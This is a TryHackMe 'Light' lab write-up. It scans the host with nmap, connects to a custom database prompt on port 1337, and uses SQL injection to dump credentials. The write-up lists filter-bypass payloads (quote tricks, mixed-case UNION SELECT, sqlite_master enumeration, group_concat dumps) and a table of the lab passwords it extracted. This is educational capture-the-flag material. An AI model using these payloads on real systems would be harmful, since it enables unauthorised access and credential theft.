# TryHackMe Light Writeup

<img width="1084" height="275" alt="image" src="https://github.com/user-attachments/assets/2c0ea9f4-70d3-4c5b-abe0-490b1b16590a" />

## **`Nmap`** Scan

```ruby
 nmap -sCV 10.81.145.244
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-20 11:00 EDT
Nmap scan report for 10.130.152.28
Host is up (0.081s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9c:13:a9:88:f8:74:47:88:ec:66:4b:e4:ee:2b:f6:32 (RSA)
|   256 4b:0d:75:b3:87:30:3a:a1:e7:c9:ef:1b:1e:d3:8e:1c (ECDSA)
|_  256 bd:6d:9b:22:c0:ae:65:0b:45:04:a2:83:f8:cf:6c:0c (ED25519)
1337/tcp open  waste?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     Welcome to the Light database!
|     Please enter your username:
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest: 
|     Welcome to the Light database!
|     Please enter your username: Username not found.
|_    Please enter your username:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.95%I=7%D=3/20%Time=69BD6215%P=x86_64-pc-linux-gnu%r(NU
SF:LL,3B,"Welcome\x20to\x20the\x20Light\x20database!\nPlease\x20enter\x20y
SF:our\x20username:\x20")%r(GenericLines,6B,"Welcome\x20to\x20the\x20Light
SF:\x20database!\nPlease\x20enter\x20your\x20username:\x20Username\x20not\

```

---

```
nc 10.130.152.28 1337
```

<img width="751" height="124" alt="image" src="https://github.com/user-attachments/assets/d11e54f0-fa09-431e-8237-20853ee06334" />

## let's try to break it and do sqli

```
' OR 1=1--
```

<img width="731" height="119" alt="image" src="https://github.com/user-attachments/assets/0f579aa2-44c5-4253-b778-d1e365f9d810" />

## so forbbden chars is 

```
/*, -- or, %0b
```

## let's bypass it 

```
smokey' OR '1'='1
```

<img width="753" height="62" alt="image" src="https://github.com/user-attachments/assets/0f04ee9f-b7c5-46d5-bd18-d3286234982e" />

## it response with first user in table 

##  when i try to write 

```
 ' OR username='smokey
```

> ## it give me **`smokey`** pass and when i do it to admin user not found 

```
 ' OR username='admin
 ' OR substr(password,1,1)='t
```

<img width="681" height="157" alt="image" src="https://github.com/user-attachments/assets/5523b0d7-57d5-4597-b353-046191294eda" />

> ## from this we confirmed that it response with first pass in table 

## lets use union with bypass filter to find versoin 

```
' UniOn SeLeCt @@version '
' UniOn SeLeCt version() '
' UniOn SeLeCt sqlite_version() '
```

<img width="663" height="113" alt="image" src="https://github.com/user-attachments/assets/083dcd1c-1f5a-457e-93f7-9969798b8b56" />

## lets find db structue 

```
' UniOn SeLeCt group_concat(sql) FROM sqlite_master '
```

<img width="734" height="214" alt="image" src="https://github.com/user-attachments/assets/28f28e5a-1411-4529-99e8-d068357da6ba" />

## let's get usernames and passwords from usertable

```
' UniOn SeLeCt group_concat(username) FROM usertable '
' UniOn SeLeCt group_concat(password) FROM usertable '
```

Complete User List from usertable:
----------------------------------

| Username | Password |
| --- | --- |
| alice | tF8tj2o94WE4LKC |
| rob | yAn4fPaF2qpCKpR |
| john | e74tqwRh2oApPo6 |
| michael | 7DV4dwA0g5FacRe |
| smokey | vYQ5ngPpw8AdUmL |
| hazel | EcSuU35WlVipjXG |
| ralph | YO1U9O1m52aJImA |
| steve | WObjufHX1foR8d7 |

<img width="780" height="199" alt="image" src="https://github.com/user-attachments/assets/5c8f4058-dc6b-415a-976b-858183c51776" />

## let's get usernames and passwords from admin table 

```
' UniOn SeLeCt group_concat(username) FROM admintable '
' UniOn SeLeCt group_concat(password) FROM admintable '
```

<img width="725" height="185" alt="image" src="https://github.com/user-attachments/assets/e5100a1e-a8f8-433c-8070-d182d09d4419" />

